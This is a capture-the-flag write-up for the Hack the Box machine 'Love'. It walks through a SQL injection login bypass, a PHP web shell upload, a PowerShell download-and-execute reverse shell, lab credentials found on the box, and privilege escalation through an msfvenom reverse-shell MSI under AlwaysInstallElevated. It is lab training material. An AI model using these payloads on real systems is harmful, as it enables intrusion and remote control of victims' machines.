---
title: Love
tags: windows
description: Write-up for Hack the Box - Love
---

![2021-09-07_07-04.png](/home/sixstringacks/share/git/tmp_assets/10c88df76c6a1df90ef6639f020ab85ce7cf1179.png)

## Overview

## Enumeration

**Software**

* Windows 10 Pro 19042

* ApacheFriends XAMPP Version 7.3.27

* Apache 2.4.46                                                                                                                                                                                                                            

* MariaDB 10.4.18                                                                                                                                                                                                                          

* PHP 7.3.27 (VC15 X86 64bit thread safe) + PEAR                                                                                                                                                                                           

* phpMyAdmin 5.1.0                                                                                                                                                                                                                         

* OpenSSL 1.1.0g                                                                                                                                                                                                                           

* ADOdb 518a                                                                                                                                                                                                                               

* Mercury Mail Transport System v4.63 (not included in the portable version)                                                                                                                                                               

* FileZilla FTP Server 0.9.41 (not included in the portable version)                                                                                                                                                                       

* Webalizer 2.23-04 (not included in the portable version)                                                                                                                                                                                 

* Strawberry Perl 5.32.0.1 Portable                                                                                                                                                                                                        

* Tomcat 7.0.108                                                                                                                                                                                                                           

* XAMPP Control Panel Version 3.2.4.                                                                                                                                                                                                       

* XAMPP mailToDisk 1.0

**Open Ports**

```
nmap -vv --reason -Pn -sT -A --osscan-guess -p- -oN results/10.10.10.239/scans/_full_tcp_nmap.txt
```

* 80/tcp - http

* 135/tcp - Windows RPC

* 139/tcp - Netbios

* 443/tcp - https

* 3306/tcp - MySQL

* 5000/tcp - http

* 5040/tcp - unknown (windows deployment services?)

* 5985/tcp - WinRM

* 7680/tcp - pando-pub?

* 47001/tcp - ?

* 49664-70/tcp - Windows RPC

## Steps (User)

http site, Voting System using PHP. Did a search and there is an exploit https://www.exploit-db.com/exploits/49846, tried and did not appear to work

ssl cert staging.love.htb, updated /etc/hosts, went to site and received 403 forbidden

sqlmap vulnerable to blind sql injection, but no sensitive data received from database

```

```

exploit bcrypt worked, created bcrypt has for password1, intercepted with burp and wsa able to bypass

```
POST /admin/login.php HTTP/1.1
Host: 10.10.10.239
DNT: 1
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: de-DE,de;q=0.9,en-US;q=0.8,en;q=0.7
Cookie: PHPSESSID=tliephrsj1d5ljhbvsbccnqmff
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 171

login=yea&password=password1&username=asdfdf' UNION SELECT 1,2,"$2a$12$GePYTQLUfpDac2XYtvj9de2I50zyK54f5gkYlu5VNOJ9JR46NRDly",4,5,6,7 from INFORMATION_SCHEMA.SCHEMATA;-- -
```

![2021-09-08_16-56.png](/home/sixstringacks/share/git/tmp_assets/fe72e69bfca5e0402b41da3e74a2f3a0f2bbf324.png)

second exploit to upload shell

[Online Voting System 1.0 - Remote Code Execution (Authenticated) - PHP webapps Exploit](https://www.exploit-db.com/exploits/50076)

![2021-09-08_17-04.png](/home/sixstringacks/share/git/tmp_assets/a1500ae055d66c05cd8f67c4e9b8e50b587da32c.png)

```
Content-Disposition: form-data; name="photo"; filename="rshell.php"
Content-Type: application/octet-stream

<?php echo shell_exec($_GET["cmd"]); ?>
```

![2021-09-08_17-05.png](/home/sixstringacks/share/git/tmp_assets/ea53c273793a6e868576daf3379a6e8a666213f1.png)

![2021-09-08_17-02.png](/home/sixstringacks/share/git/tmp_assets/dbe320172251daae3cb5b5874522f7d4db9b7331.png)

![2021-09-08_17-05_1.png](/home/sixstringacks/share/git/tmp_assets/95f40cfb4e8cd61e1fd97a3ce83266a1b7d55f90.png)

```
powershell IEX (New-Object Net.WebClient).DownloadString('http://10.10.14.9/mini-reverse.ps1')
```

![2021-09-08_17-23.png](/home/sixstringacks/share/git/tmp_assets/048e5924537789eac5ecf77344e27fd2b64ca596.png)

> I ultimately switched over to Invoke-PowerShellTcp.ps1 that I used for previous boxes because it provided a better shell 
> 
> powershell IEX (New-Object Net.WebClient).DownloadString('http://10.10.14.9/mini-reverse.ps1')

## Steps (root/system)

found password c:\xampp\htdocs\omrs\includes\conn.php phoebe:HTB#9826^)__

![2021-09-08_17-42.png](/home/sixstringacks/share/git/tmp_assets/251b5401162cc458cb9a3b548bdb63244174f0a1.png)

I also found the admin password. This was only good for the voting website

![2021-09-08_17-44.png](/home/sixstringacks/share/git/tmp_assets/8c99da20b73d9ec9fa682661fd133e77834754d4.png)

admin:@LoveIsInTheAir!!!!

Phoebe in Remote Management users and port 5985 open, so WinRM can be used

![2021-09-09_08-11.png](/home/sixstringacks/share/git/tmp_assets/b7e9d80a0aa95c331e2e38c3eed285d09bd2cb87.png)

upgrade shell

```
evil-winrm -i 10.10.10.239 -u phoebe -p "HTB#9826^(_" 
```

![2021-09-09_08-15.png](/home/sixstringacks/share/git/tmp_assets/67638681301ce979b68a0e9a9fb34883e950ac36.png)

WinPEAS showed that  AlwaysInstallElevated registry key was set to 1. Which does...

![2021-09-12_13-49.png](/home/sixstringacks/share/git/tmp_assets/3617c9e48e133b6ed65a3ece8034b8f9c297562f.png)

And also a path rule which appeared to allow Phoebe to run msi files from the c:\administration path

![2021-09-11_11-47.png](/home/sixstringacks/share/git/tmp_assets/6a32e19cab2d87488daa0de48a80ff758a6f0007.png)

I created a reverse shell msi with msfvenom and copied it to the box

```
msfvenom -p windows -a x64 --payload windows/x64/shell_reverse_tcp LHOST=10.10.14.9 LPORT=4201 -f msi --out privesc.msi
```

I ran the msi file from c:\administration (as predicted, it did not work when trying to run from Phoebe's home folder) and received a callback and reverse shell as 'nt authority\system'

```
cmd /c "msiexec /quiet /qn /i c:\administration\privesc.msi"
```

> unfortunately i had issues running the msi in WinRM, so I had to revert back to the webshell i was using previously.

![2021-09-12_14-10.png](/home/sixstringacks/share/git/tmp_assets/9e9b09b057f0f663ad39fc901ea8f91cc01169b6.png)
